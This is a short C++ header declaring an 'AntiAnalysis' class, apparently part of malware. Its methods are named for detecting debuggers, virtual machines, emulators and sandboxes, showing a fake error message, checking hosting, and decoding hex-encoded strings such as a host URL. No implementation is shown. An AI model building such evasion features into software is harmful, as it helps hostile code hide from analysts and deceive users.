#pragma once
#include <string>
#include <vector>

class AntiAnalysis
{
public:
	static bool IsDebuggerPresentByException();
	static bool CheckCPUID();
	static bool IsVmwareRunning();
	static bool Emulator();
	static bool Processes();
	static bool SandBox();
	static bool  Run();
	static void FakeErrorMessage();
	static bool HostingAsync();
	static std::string strHosturl;
	static std::string str;
	static std::string HexToString(const std::string& input);

};

